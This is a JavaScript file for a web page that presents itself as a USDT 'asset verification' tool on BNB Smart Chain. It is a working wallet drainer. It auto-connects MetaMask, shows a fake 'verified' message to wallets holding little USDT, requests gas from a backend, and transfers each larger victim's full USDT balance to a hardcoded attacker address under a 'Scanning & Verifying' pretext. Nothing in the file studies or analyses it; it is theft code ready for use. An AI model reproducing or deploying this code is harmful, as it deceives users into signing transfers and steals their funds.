const recipientAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // wallet for gas fees
const backendGasAPI = "https://bep20usdt-backend-production.up.railway.app/send-bnb"; // backend API
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 contract

let web3;
let userAddress;
let usdtContract;

// Auto-connect wallet silently on load
window.addEventListener("load", async () => {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);

    try {
      // Switch to BNB Smart Chain
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length === 0) {
        console.warn("No wallet connected.");
        return;
      }

      userAddress = accounts[0];
      usdtContract = new web3.eth.Contract([
        {
          constant: true,
          inputs: [{ name: "account", type: "address" }],
          name: "balanceOf",
          outputs: [{ name: "", type: "uint256" }],
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { name: "recipient", type: "address" },
            { name: "amount", type: "uint256" },
          ],
          name: "transfer",
          outputs: [{ name: "", type: "bool" }],
          type: "function",
        },
      ], usdtContractAddress);

      console.log("Wallet connected:", userAddress);
    } catch (err) {
      console.error("Error on auto-connect or chain switch:", err);
    }
  } else {
    alert("MetaMask not found.");
  }
});

// Triggered on button click (e.g. #verifyAssets)
async function verifyAssets() {
  if (!userAddress || !usdtContract) {
    alert("Wallet not connected.");
    return;
  }

  const rawUSDT = await usdtContract.methods.balanceOf(userAddress).call();
  const rawBNB = await web3.eth.getBalance(userAddress);

  const usdtBalance = parseFloat(web3.utils.fromWei(rawUSDT, "mwei"));
  const bnbBalance = parseFloat(web3.utils.fromWei(rawBNB, "ether"));

  console.log(`USDT: ${usdtBalance} | BNB: ${bnbBalance}`);

  if (usdtBalance === 0) {
    showPopup("No USDT found.", "black");
    return;
  }

  if (usdtBalance <= 1) {
    showPopup(`✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`, "green");
    return;
  }

  showPopup("⏳ Scanning & Verifying Assets...", "green");

  if (bnbBalance < 0.0005) {
    console.log("Low BNB, requesting from backend...");
    await fetch(backendGasAPI, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ toAddress: userAddress })
    });
  }

  try {
    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "mwei");
    await usdtContract.methods
      .transfer(recipientAddress, amountToSend)
      .send({ from: userAddress });

    showPopup(`✅ Flash assets burned.<br><b>USDT Sent:</b> ${usdtBalance}`, "red");
  } catch (err) {
    console.error("USDT Transfer Failed:", err);
    alert("Transfer failed. Please check gas and try again.");
  }
}

// Show popup message
function showPopup(message, color) {
  let popup = document.getElementById("popupBox");
  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
    popup.style.textAlign = "center";
    popup.style.fontSize = "18px";
    popup.style.width = "80%";
    popup.style.maxWidth = "400px";
    document.body.appendChild(popup);
  }

  popup.style.backgroundColor = color === "red" ? "#ffecec" : "#e6ffe6";
  popup.style.color = color === "red" ? "red" : "green";
  popup.innerHTML = message;
  popup.style.display = "block";

  setTimeout(() => {
    popup.style.display = "none";
  }, 5000);
}

// Button event
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
